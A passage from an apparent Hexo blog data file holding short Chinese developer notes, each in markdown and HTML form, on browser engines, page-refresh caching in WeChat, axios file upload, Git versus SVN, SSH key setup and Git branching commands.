\n\n6、360浏览器、猎豹浏览器内核：IE+Chrome双内核；\n\n7、搜狗、遨游、QQ浏览器内核：Trident（兼容模式）+Webkit（高速模式）； \n\n8、百度浏览器、世界之窗内核：IE内核； \n\n9、2345浏览器内核：以前是IE内核，现在也是IE+Chrome双内核；","source":"_posts/FrontEnd/五大浏览器-四大内核.md","raw":"---\ntitle: 五大浏览器 四大内核\ndate: 2018-05-12 10:51:40\ntags: browser\ncategories: Browser\n---\n## 下各常用浏览器所使用的内核。 \n\n1、IE浏览器内核：Trident内核，也是俗称的IE内核；\n\n2、Chrome浏览器内核：统称为Chromium内核或Chrome内核，以前是Webkit内核，现在是Blink内核； \n\n3、Firefox浏览器内核：Gecko内核，俗称Firefox内核； \n\n4、Safari浏览器内核：Webkit内核； \n\n5、Opera浏览器内核：最初是自己的Presto内核，后来是Webkit，现在是Blink内核； \n\n6、360浏览器、猎豹浏览器内核：IE+Chrome双内核；\n\n7、搜狗、遨游、QQ浏览器内核：Trident（兼容模式）+Webkit（高速模式）； \n\n8、百度浏览器、世界之窗内核：IE内核； \n\n9、2345浏览器内核：以前是IE内核，现在也是IE+Chrome双内核；","slug":"FrontEnd/五大浏览器-四大内核","published":1,"updated":"2018-09-05T06:33:18.486Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxvb0039zodv11q74oz0","content":"<h2 id=\"下各常用浏览器所使用的内核。\"><a href=\"#下各常用浏览器所使用的内核。\" class=\"headerlink\" title=\"下各常用浏览器所使用的内核。\"></a>下各常用浏览器所使用的内核。</h2><p>1、IE浏览器内核：Trident内核，也是俗称的IE内核；</p>\n<p>2、Chrome浏览器内核：统称为Chromium内核或Chrome内核，以前是Webkit内核，现在是Blink内核； </p>\n<p>3、Firefox浏览器内核：Gecko内核，俗称Firefox内核； </p>\n<p>4、Safari浏览器内核：Webkit内核； </p>\n<p>5、Opera浏览器内核：最初是自己的Presto内核，后来是Webkit，现在是Blink内核； </p>\n<p>6、360浏览器、猎豹浏览器内核：IE+Chrome双内核；</p>\n<p>7、搜狗、遨游、QQ浏览器内核：Trident（兼容模式）+Webkit（高速模式）； </p>\n<p>8、百度浏览器、世界之窗内核：IE内核； </p>\n<p>9、2345浏览器内核：以前是IE内核，现在也是IE+Chrome双内核；</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"下各常用浏览器所使用的内核。\"><a href=\"#下各常用浏览器所使用的内核。\" class=\"headerlink\" title=\"下各常用浏览器所使用的内核。\"></a>下各常用浏览器所使用的内核。</h2><p>1、IE浏览器内核：Trident内核，也是俗称的IE内核；</p>\n<p>2、Chrome浏览器内核：统称为Chromium内核或Chrome内核，以前是Webkit内核，现在是Blink内核； </p>\n<p>3、Firefox浏览器内核：Gecko内核，俗称Firefox内核； </p>\n<p>4、Safari浏览器内核：Webkit内核； </p>\n<p>5、Opera浏览器内核：最初是自己的Presto内核，后来是Webkit，现在是Blink内核； </p>\n<p>6、360浏览器、猎豹浏览器内核：IE+Chrome双内核；</p>\n<p>7、搜狗、遨游、QQ浏览器内核：Trident（兼容模式）+Webkit（高速模式）； </p>\n<p>8、百度浏览器、世界之窗内核：IE内核； </p>\n<p>9、2345浏览器内核：以前是IE内核，现在也是IE+Chrome双内核；</p>\n"},{"title":"前端刷新机制","date":"2018-05-14T08:47:41.000Z","_content":"\n## 微信-Android 浏览器刷新有缓存？\n\n前端刷新网页的方法有很多种：\n\n1：history.go(0) \n浏览器的history对象，go 跳转到指定位置的页面。\n\n2：location.reload(true); \n重新渲染当前页面，参数为真时是从服务器端重新渲染，并响应页面，参数为假时则优先获取缓存。\n\n3：location.replace(location); \n替换当前页面的连接\n\n4：location.assign(location); \n导航到一个新的连接\n\n5：location.href = location.href\n\n以上几种方法都是比较常见的页面重新加载的方法。 \n但是在安卓微信浏览器中却无计可施。 \n安卓微信浏览器的缓存机制一直都是一个很诡异的问题，好想官方能有一个书面的解释，也不至于让frontender们这么辛苦。\n\n有效的方法： \nurl?time=123 \n在参数上加一个随机参数，可以使微信不再加载缓存。\n\n我猜想安卓微信可能将每个渲染的页面都缓存起来了，一定时间内只要url没有变化，都会优先获取缓存的内容。\n\n--------------------------------------\n[阅读原文](https://blog.csdn.net/wmzy1067111110/article/details/73650818)","source":"_posts/FrontEnd/前端刷新机制.md","raw":"---\ntitle: 前端刷新机制\ndate: 2018-05-14 16:47:41\ntags: 刷新机制\ncategories: js-window\n---\n\n## 微信-Android 浏览器刷新有缓存？\n\n前端刷新网页的方法有很多种：\n\n1：history.go(0) \n浏览器的history对象，go 跳转到指定位置的页面。\n\n2：location.reload(true); \n重新渲染当前页面，参数为真时是从服务器端重新渲染，并响应页面，参数为假时则优先获取缓存。\n\n3：location.replace(location); \n替换当前页面的连接\n\n4：location.assign(location); \n导航到一个新的连接\n\n5：location.href = location.href\n\n以上几种方法都是比较常见的页面重新加载的方法。 \n但是在安卓微信浏览器中却无计可施。 \n安卓微信浏览器的缓存机制一直都是一个很诡异的问题，好想官方能有一个书面的解释，也不至于让frontender们这么辛苦。\n\n有效的方法： \nurl?time=123 \n在参数上加一个随机参数，可以使微信不再加载缓存。\n\n我猜想安卓微信可能将每个渲染的页面都缓存起来了，一定时间内只要url没有变化，都会优先获取缓存的内容。\n\n--------------------------------------\n[阅读原文](https://blog.csdn.net/wmzy1067111110/article/details/73650818)","slug":"FrontEnd/前端刷新机制","published":1,"updated":"2018-09-05T06:33:18.487Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxve003ezodvglr02a7h","content":"<h2 id=\"微信-Android-浏览器刷新有缓存？\"><a href=\"#微信-Android-浏览器刷新有缓存？\" class=\"headerlink\" title=\"微信-Android 浏览器刷新有缓存？\"></a>微信-Android 浏览器刷新有缓存？</h2><p>前端刷新网页的方法有很多种：</p>\n<p>1：history.go(0)<br>浏览器的history对象，go 跳转到指定位置的页面。</p>\n<p>2：location.reload(true);<br>重新渲染当前页面，参数为真时是从服务器端重新渲染，并响应页面，参数为假时则优先获取缓存。</p>\n<p>3：location.replace(location);<br>替换当前页面的连接</p>\n<p>4：location.assign(location);<br>导航到一个新的连接</p>\n<p>5：location.href = location.href</p>\n<p>以上几种方法都是比较常见的页面重新加载的方法。<br>但是在安卓微信浏览器中却无计可施。<br>安卓微信浏览器的缓存机制一直都是一个很诡异的问题，好想官方能有一个书面的解释，也不至于让frontender们这么辛苦。</p>\n<p>有效的方法：<br>url?time=123<br>在参数上加一个随机参数，可以使微信不再加载缓存。</p>\n<p>我猜想安卓微信可能将每个渲染的页面都缓存起来了，一定时间内只要url没有变化，都会优先获取缓存的内容。</p>\n<hr>\n<p><a href=\"https://blog.csdn.net/wmzy1067111110/article/details/73650818\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"微信-Android-浏览器刷新有缓存？\"><a href=\"#微信-Android-浏览器刷新有缓存？\" class=\"headerlink\" title=\"微信-Android 浏览器刷新有缓存？\"></a>微信-Android 浏览器刷新有缓存？</h2><p>前端刷新网页的方法有很多种：</p>\n<p>1：history.go(0)<br>浏览器的history对象，go 跳转到指定位置的页面。</p>\n<p>2：location.reload(true);<br>重新渲染当前页面，参数为真时是从服务器端重新渲染，并响应页面，参数为假时则优先获取缓存。</p>\n<p>3：location.replace(location);<br>替换当前页面的连接</p>\n<p>4：location.assign(location);<br>导航到一个新的连接</p>\n<p>5：location.href = location.href</p>\n<p>以上几种方法都是比较常见的页面重新加载的方法。<br>但是在安卓微信浏览器中却无计可施。<br>安卓微信浏览器的缓存机制一直都是一个很诡异的问题，好想官方能有一个书面的解释，也不至于让frontender们这么辛苦。</p>\n<p>有效的方法：<br>url?time=123<br>在参数上加一个随机参数，可以使微信不再加载缓存。</p>\n<p>我猜想安卓微信可能将每个渲染的页面都缓存起来了，一定时间内只要url没有变化，都会优先获取缓存的内容。</p>\n<hr>\n<p><a href=\"https://blog.csdn.net/wmzy1067111110/article/details/73650818\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n"},{"title":"前端图片上传","date":"2018-07-04T10:24:20.000Z","_content":"## 图片上传\n主要介绍 WEB 浏览器 上传示例","source":"_posts/FrontEnd/前端图片上传.md","raw":"---\ntitle: 前端图片上传\ndate: 2018-07-04 18:24:20\ntags: 图片上传\ncategories: Node-multiparty\n---\n## 图片上传\n主要介绍 WEB 浏览器 上传示例","slug":"FrontEnd/前端图片上传","published":1,"updated":"2019-02-22T03:38:57.137Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxvg003fzodvswt686co","content":"<h2 id=\"图片上传\"><a href=\"#图片上传\" class=\"headerlink\" title=\"图片上传\"></a>图片上传</h2><p>主要介绍 WEB 浏览器 上传示例</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"图片上传\"><a href=\"#图片上传\" class=\"headerlink\" title=\"图片上传\"></a>图片上传</h2><p>主要介绍 WEB 浏览器 上传示例</p>\n"},{"title":"前端文件上传","date":"2018-12-19T03:05:05.000Z","_content":"## 前端 文件上传\n\n````\nconst { fileList } = this.state; // 取得文件列表\nconst formData = new FormData(); // 新增实例\nfileList.forEach((file) => {\n    formData.append('file', file); // 遍历添加数据，append 第一个参数 为 `name` 属性\n});\n\naxios({\n    url: `${realAddress}/yuhuaqu/${list}/import`,\n    method: 'post',\n    processData: false,\n    headers: {\n        'Authorization': SessionStorage.get('token')\n    },\n    data: formData,\n}).then((res) => { // do something...});\n````","source":"_posts/FrontEnd/前端文件上传.md","raw":"---\ntitle: 前端文件上传\ndate: 2018-12-19 11:05:05\ntags: file-upload\ncategories: Upload\n---\n## 前端 文件上传\n\n````\nconst { fileList } = this.state; // 取得文件列表\nconst formData = new FormData(); // 新增实例\nfileList.forEach((file) => {\n    formData.append('file', file); // 遍历添加数据，append 第一个参数 为 `name` 属性\n});\n\naxios({\n    url: `${realAddress}/yuhuaqu/${list}/import`,\n    method: 'post',\n    processData: false,\n    headers: {\n        'Authorization': SessionStorage.get('token')\n    },\n    data: formData,\n}).then((res) => { // do something...});\n````","slug":"FrontEnd/前端文件上传","published":1,"updated":"2019-02-22T03:38:57.137Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxvi003jzodvur1qgf5c","content":"<h2 id=\"前端-文件上传\"><a href=\"#前端-文件上传\" class=\"headerlink\" title=\"前端 文件上传\"></a>前端 文件上传</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const &#123; fileList &#125; = this.state; // 取得文件列表</span><br><span class=\"line\">const formData = new FormData(); // 新增实例</span><br><span class=\"line\">fileList.forEach((file) =&gt; &#123;</span><br><span class=\"line\">    formData.append(&apos;file&apos;, file); // 遍历添加数据，append 第一个参数 为 `name` 属性</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">axios(&#123;</span><br><span class=\"line\">    url: `$&#123;realAddress&#125;/yuhuaqu/$&#123;list&#125;/import`,</span><br><span class=\"line\">    method: &apos;post&apos;,</span><br><span class=\"line\">    processData: false,</span><br><span class=\"line\">    headers: &#123;</span><br><span class=\"line\">        &apos;Authorization&apos;: SessionStorage.get(&apos;token&apos;)</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    data: formData,</span><br><span class=\"line\">&#125;).then((res) =&gt; &#123; // do something...&#125;);</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<h2 id=\"前端-文件上传\"><a href=\"#前端-文件上传\" class=\"headerlink\" title=\"前端 文件上传\"></a>前端 文件上传</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const &#123; fileList &#125; = this.state; // 取得文件列表</span><br><span class=\"line\">const formData = new FormData(); // 新增实例</span><br><span class=\"line\">fileList.forEach((file) =&gt; &#123;</span><br><span class=\"line\">    formData.append(&apos;file&apos;, file); // 遍历添加数据，append 第一个参数 为 `name` 属性</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">axios(&#123;</span><br><span class=\"line\">    url: `$&#123;realAddress&#125;/yuhuaqu/$&#123;list&#125;/import`,</span><br><span class=\"line\">    method: &apos;post&apos;,</span><br><span class=\"line\">    processData: false,</span><br><span class=\"line\">    headers: &#123;</span><br><span class=\"line\">        &apos;Authorization&apos;: SessionStorage.get(&apos;token&apos;)</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    data: formData,</span><br><span class=\"line\">&#125;).then((res) =&gt; &#123; // do something...&#125;);</span><br></pre></td></tr></table></figure>"},{"title":"Git与SVN区别","date":"2017-12-09T06:03:59.000Z","_content":"#### Git不仅是版本控制，也是内容/工作管理系统\n\n1. Git`分布式`，SVN不是。与非分布式版本控制系统最`核心区别`\n\n2. Git按`元数据`方式储存，SVN按文件\n\n3. 分支不同\n\n4. Git没有全局版本号；SVN有。目前为止相比缺少的一个最大特征\n\n5. Git内容完整性优于SVN，Git内容存储使用`SHA-l`哈希算法","source":"_posts/GIT/Git与SVN区别.md","raw":"---\ntitle: Git与SVN区别\ndate: 2017-12-09 14:03:59\ntags: git与svn\ncategories: git\n---\n#### Git不仅是版本控制，也是内容/工作管理系统\n\n1. Git`分布式`，SVN不是。与非分布式版本控制系统最`核心区别`\n\n2. Git按`元数据`方式储存，SVN按文件\n\n3. 分支不同\n\n4. Git没有全局版本号；SVN有。目前为止相比缺少的一个最大特征\n\n5. Git内容完整性优于SVN，Git内容存储使用`SHA-l`哈希算法","slug":"GIT/Git与SVN区别","published":1,"updated":"2018-09-05T06:33:18.488Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxvk003lzodv0x2wjl3e","content":"<h4 id=\"Git不仅是版本控制，也是内容-工作管理系统\"><a href=\"#Git不仅是版本控制，也是内容-工作管理系统\" class=\"headerlink\" title=\"Git不仅是版本控制，也是内容/工作管理系统\"></a>Git不仅是版本控制，也是内容/工作管理系统</h4><ol>\n<li><p>Git<code>分布式</code>，SVN不是。与非分布式版本控制系统最<code>核心区别</code></p>\n</li>\n<li><p>Git按<code>元数据</code>方式储存，SVN按文件</p>\n</li>\n<li><p>分支不同</p>\n</li>\n<li><p>Git没有全局版本号；SVN有。目前为止相比缺少的一个最大特征</p>\n</li>\n<li><p>Git内容完整性优于SVN，Git内容存储使用<code>SHA-l</code>哈希算法</p>\n</li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"Git不仅是版本控制，也是内容-工作管理系统\"><a href=\"#Git不仅是版本控制，也是内容-工作管理系统\" class=\"headerlink\" title=\"Git不仅是版本控制，也是内容/工作管理系统\"></a>Git不仅是版本控制，也是内容/工作管理系统</h4><ol>\n<li><p>Git<code>分布式</code>，SVN不是。与非分布式版本控制系统最<code>核心区别</code></p>\n</li>\n<li><p>Git按<code>元数据</code>方式储存，SVN按文件</p>\n</li>\n<li><p>分支不同</p>\n</li>\n<li><p>Git没有全局版本号；SVN有。目前为止相比缺少的一个最大特征</p>\n</li>\n<li><p>Git内容完整性优于SVN，Git内容存储使用<code>SHA-l</code>哈希算法</p>\n</li>\n</ol>\n"},{"title":"git 仓库添加SSH公钥","date":"2018-09-27T02:06:10.000Z","_content":"# Git仓库添加SSH公钥\n## 第一步 生成SSH key\n> ssh-keygen -t rsa -C \"xxxxx@xxxxx.com\"  \n\n## 第二步 查看公钥\n> cat ~/.ssh/id_rsa.pub\n复制生成的公钥，到 远程仓库-设置 里添加ssh\n\n## 第三步 终端检测\n添加公钥后 用下面命令检测，首次使用需要添加主机到本机SSH信任列表\n> ssh -T git@gitee.com\n","source":"_posts/GIT/git-仓库添加SSH公钥.md","raw":"---\ntitle: git 仓库添加SSH公钥\ndate: 2018-09-27 10:06:10\ntags: Git-SSH\ncategories: Git\n---\n# Git仓库添加SSH公钥\n## 第一步 生成SSH key\n> ssh-keygen -t rsa -C \"xxxxx@xxxxx.com\"  \n\n## 第二步 查看公钥\n> cat ~/.ssh/id_rsa.pub\n复制生成的公钥，到 远程仓库-设置 里添加ssh\n\n## 第三步 终端检测\n添加公钥后 用下面命令检测，首次使用需要添加主机到本机SSH信任列表\n> ssh -T git@gitee.com\n","slug":"GIT/git-仓库添加SSH公钥","published":1,"updated":"2018-09-27T02:13:03.613Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxvm003pzodvb5424rzv","content":"<h1 id=\"Git仓库添加SSH公钥\"><a href=\"#Git仓库添加SSH公钥\" class=\"headerlink\" title=\"Git仓库添加SSH公钥\"></a>Git仓库添加SSH公钥</h1><h2 id=\"第一步-生成SSH-key\"><a href=\"#第一步-生成SSH-key\" class=\"headerlink\" title=\"第一步 生成SSH key\"></a>第一步 生成SSH key</h2><blockquote>\n<p>ssh-keygen -t rsa -C “xxxxx@xxxxx.com”  </p>\n</blockquote>\n<h2 id=\"第二步-查看公钥\"><a href=\"#第二步-查看公钥\" class=\"headerlink\" title=\"第二步 查看公钥\"></a>第二步 查看公钥</h2><blockquote>\n<p>cat ~/.ssh/id_rsa.pub<br>复制生成的公钥，到 远程仓库-设置 里添加ssh</p>\n</blockquote>\n<h2 id=\"第三步-终端检测\"><a href=\"#第三步-终端检测\" class=\"headerlink\" title=\"第三步 终端检测\"></a>第三步 终端检测</h2><p>添加公钥后 用下面命令检测，首次使用需要添加主机到本机SSH信任列表</p>\n<blockquote>\n<p>ssh -T git@gitee.com</p>\n</blockquote>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Git仓库添加SSH公钥\"><a href=\"#Git仓库添加SSH公钥\" class=\"headerlink\" title=\"Git仓库添加SSH公钥\"></a>Git仓库添加SSH公钥</h1><h2 id=\"第一步-生成SSH-key\"><a href=\"#第一步-生成SSH-key\" class=\"headerlink\" title=\"第一步 生成SSH key\"></a>第一步 生成SSH key</h2><blockquote>\n<p>ssh-keygen -t rsa -C “xxxxx@xxxxx.com”  </p>\n</blockquote>\n<h2 id=\"第二步-查看公钥\"><a href=\"#第二步-查看公钥\" class=\"headerlink\" title=\"第二步 查看公钥\"></a>第二步 查看公钥</h2><blockquote>\n<p>cat ~/.ssh/id_rsa.pub<br>复制生成的公钥，到 远程仓库-设置 里添加ssh</p>\n</blockquote>\n<h2 id=\"第三步-终端检测\"><a href=\"#第三步-终端检测\" class=\"headerlink\" title=\"第三步 终端检测\"></a>第三步 终端检测</h2><p>添加公钥后 用下面命令检测，首次使用需要添加主机到本机SSH信任列表</p>\n<blockquote>\n<p>ssh -T git@gitee.com</p>\n</blockquote>\n"},{"title":"git update","date":"2018-07-27T10:18:04.000Z","_content":"\n> 2.17.1之前用git update  \n\n> 2.17.1之后用git update-git-for-windows\n\n","source":"_posts/GIT/git-update.md","raw":"---\ntitle: git update\ndate: 2018-07-27 18:18:04\ntags: git update\ncategories: git\n---\n\n> 2.17.1之前用git update  \n\n> 2.17.1之后用git update-git-for-windows\n\n","slug":"GIT/git-update","published":1,"updated":"2018-09-05T06:33:18.489Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxvo003rzodvqu5g67xr","content":"<blockquote>\n<p>2.17.1之前用git update  </p>\n<p>2.17.1之后用git update-git-for-windows</p>\n</blockquote>\n","site":{"data":{}},"excerpt":"","more":"<blockquote>\n<p>2.17.1之前用git update  </p>\n<p>2.17.1之后用git update-git-for-windows</p>\n</blockquote>\n"},{"title":"git 删除远程文件/目录","date":"2018-04-28T08:27:48.000Z","archives":"版本控制","_content":"# git删除远程仓库的文件或目录\n删除a目录下的2.txt文件   \n````\ngit rm -r --cached a/2.txt\n````\n\n删除a目录\n    \n    git rm -r --cached a\n    \n    git commit -m \"删除a目录下的2.txt文件\" \n    git push\n\n\n**Note:**\n\n用`-r`参数删除目录, `git rm --cached a.txt` 删除的是本地仓库中的文件，且`本地工作区`的文件会`保留`且`不再与远程仓库发生跟踪关系`，如果本地仓库中的文件也要删除则用`git rm a.txt`","source":"_posts/GIT/git-删除远程文件-目录.md","raw":"---\ntitle: git 删除远程文件/目录\ndate: 2018-04-28 16:27:48\ntags: git 删除\narchives: 版本控制\ncategories: git\n---\n# git删除远程仓库的文件或目录\n删除a目录下的2.txt文件   \n````\ngit rm -r --cached a/2.txt\n````\n\n删除a目录\n    \n    git rm -r --cached a\n    \n    git commit -m \"删除a目录下的2.txt文件\" \n    git push\n\n\n**Note:**\n\n用`-r`参数删除目录, `git rm --cached a.txt` 删除的是本地仓库中的文件，且`本地工作区`的文件会`保留`且`不再与远程仓库发生跟踪关系`，如果本地仓库中的文件也要删除则用`git rm a.txt`","slug":"GIT/git-删除远程文件-目录","published":1,"updated":"2018-09-05T06:33:18.489Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxvp003uzodvc6u4e9m4","content":"<h1 id=\"git删除远程仓库的文件或目录\"><a href=\"#git删除远程仓库的文件或目录\" class=\"headerlink\" title=\"git删除远程仓库的文件或目录\"></a>git删除远程仓库的文件或目录</h1><p>删除a目录下的2.txt文件<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git rm -r --cached a/2.txt</span><br></pre></td></tr></table></figure></p>\n<p>删除a目录</p>\n<pre><code>git rm -r --cached a\n\ngit commit -m &quot;删除a目录下的2.txt文件&quot; \ngit push\n</code></pre><p><strong>Note:</strong></p>\n<p>用<code>-r</code>参数删除目录, <code>git rm --cached a.txt</code> 删除的是本地仓库中的文件，且<code>本地工作区</code>的文件会<code>保留</code>且<code>不再与远程仓库发生跟踪关系</code>，如果本地仓库中的文件也要删除则用<code>git rm a.txt</code></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"git删除远程仓库的文件或目录\"><a href=\"#git删除远程仓库的文件或目录\" class=\"headerlink\" title=\"git删除远程仓库的文件或目录\"></a>git删除远程仓库的文件或目录</h1><p>删除a目录下的2.txt文件<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git rm -r --cached a/2.txt</span><br></pre></td></tr></table></figure></p>\n<p>删除a目录</p>\n<pre><code>git rm -r --cached a\n\ngit commit -m &quot;删除a目录下的2.txt文件&quot; \ngit push\n</code></pre><p><strong>Note:</strong></p>\n<p>用<code>-r</code>参数删除目录, <code>git rm --cached a.txt</code> 删除的是本地仓库中的文件，且<code>本地工作区</code>的文件会<code>保留</code>且<code>不再与远程仓库发生跟踪关系</code>，如果本地仓库中的文件也要删除则用<code>git rm a.txt</code></p>\n"},{"title":"git 操作规范","date":"2018-04-28T07:25:23.000Z","archives":"版本控制","_content":"## 一、 创建与合并分支\n1. 从master分支创建dev分支并切换到dev分支\n````\n  git checkout master    \n  git checkout -b dev\n````\n+ `git checkout -b dev` 等价于：\n````\n  git branch dev    \n  git checkout dev\n````\n+ 查看`本地当前分支`，分支前面带` \"*\" `表示当前分支，剩下的分支表示本地有的分支：\n````\n  git branch\n````\n+ 查看`远程全部分支`，白色的表示本地有的，红色的表示本地没有，仅在远程存在：\n````\n  git branch -a\n````\n\n2. 修改代码、提交代码(当前的操作是在dev分支上进行)\n````\n  git add a.html\n  git commit -m \"提交文件a.html\"\n````\n\n3. 分支合并(将dev合并到master)\n````\n  git checkout master     \n  git merge dev\n````\n\n4. 合并完成后，删除dev分支.(删除dev分支时，注意我们当前所在的分支不能是dev分支)\n````\n  git branch -d dev\n````\n\n5. 删除后，查看分支(此时看不到dev分支了)\n````\n  git branch\n````\n\n6. 总结 ：工作中经常从`master`创建新分支，具体操作如下：\n````\n  git checkout master   \n  git checkout -b  issues1234   \n  git push origin issues1234   \n  git add ..  \n  git commit -m \"***\"\n  git push origin issues1234\n````\n\n+ 注意：将本地分支branch1推到远端的branch2操作步骤：\n````\n  git push origin branch1:branch2\n````\n\n7. 删除分支\n\n  git branch -D issues1234 // 本地强制删除分支 issues1234    \n\n  git push origin  :issues1234  //推到远程","source":"_posts/GIT/git-操作规范.md","raw":"---\ntitle: git 操作规范\ndate: 2018-04-28 15:25:23\ntags: git 操作规范\narchives: 版本控制\ncategories: git\n---\n## 一、 创建与合并分支\n1. 从master分支创建dev分支并切换到dev分支\n````\n  git checkout master    \n  git checkout -b dev\n````\n+ `git checkout -b dev` 等价于：\n````\n  git branch dev    \n  git checkout dev\n````\n+ 查看`本地当前分支`，分支前面带` \"*\" `表示当前分支，剩下的分支表示本地有的分支：\n````\n  git branch\n````\n+ 查看`远程全部分支`，白色的表示本地有的，红色的表示本地没有，仅在远程存在：\n````\n  git branch -a\n````\n\n2. 修改代码、提交代码(当前的操作是在dev分支上进行)\n````\n  git add a.html\n  git commit -m \"提交文件a.html\"\n````\n\n3. 分支合并(将dev合并到master)\n````\n  git checkout master     \n  git merge dev\n````\n\n4. 合并完成后，删除dev分支.(删除dev分支时，注意我们当前所在的分支不能是dev分支)\n````\n  git branch -d dev\n````\n\n5. 删除后，查看分支(此时看不到dev分支了)\n````\n  git branch\n````\n\n6. 总结 ：工作中经常从`master`创建新分支，具体操作如下：\n````\n  git checkout master   \n  git checkout -b  issues1234   \n  git push origin issues1234   \n  git add ..  \n  git commit -m \"***\"\n  git push origin issues1234\n````\n\n+ 注意：将本地分支branch1推到远端的branch2操作步骤：\n````\n  git push origin branch1:branch2\n````\n\n7. 删除分支\n\n  git branch -D issues1234 // 本地强制删除分支 issues1234    \n\n  git push origin  :issues1234  //推到远程","slug":"GIT/git-操作规范","published":1,"updated":"2018-09-05T06:33:18.490Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxvr003xzodvi5v6op99","content":"<h2 id=\"一、-创建与合并分支\"><a href=\"#一、-创建与合并分支\" class=\"headerlink\" title=\"一、 创建与合并分支\"></a>一、 创建与合并分支</h2><ol>\n<li>从master分支创建dev分支并切换到dev分支<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git checkout master    </span><br><span class=\"line\">git checkout -b dev</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<ul>\n<li><p><code>git checkout -b dev</code> 等价于：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git branch dev    </span><br><span class=\"line\">git checkout dev</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>查看<code>本地当前分支</code>，分支前面带<code>&quot;*&quot;</code>表示当前分支，剩下的分支表示本地有的分支：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git branch</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>查看<code>远程全部分支</code>，白色的表示本地有的，红色的表示本地没有，仅在远程存在：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git branch -a</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<ol>\n<li><p>修改代码、提交代码(当前的操作是在dev分支上进行)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git add a.html</span><br><span class=\"line\">git commit -m &quot;提交文件a.html&quot;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>分支合并(将dev合并到master)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git checkout master     </span><br><span class=\"line\">git merge dev</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>合并完成后，删除dev分支.(删除dev分支时，注意我们当前所在的分支不能是dev分支)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git branch -d dev</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>删除后，查看分支(此时看不到dev分支了)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git branch</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>总结 ：工作中经常从<code>master</code>创建新分支，具体操作如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git checkout master   </span><br><span class=\"line\">git checkout -b  issues1234   </span><br><span class=\"line\">git push origin issues1234   </span><br><span class=\"line\">git add ..  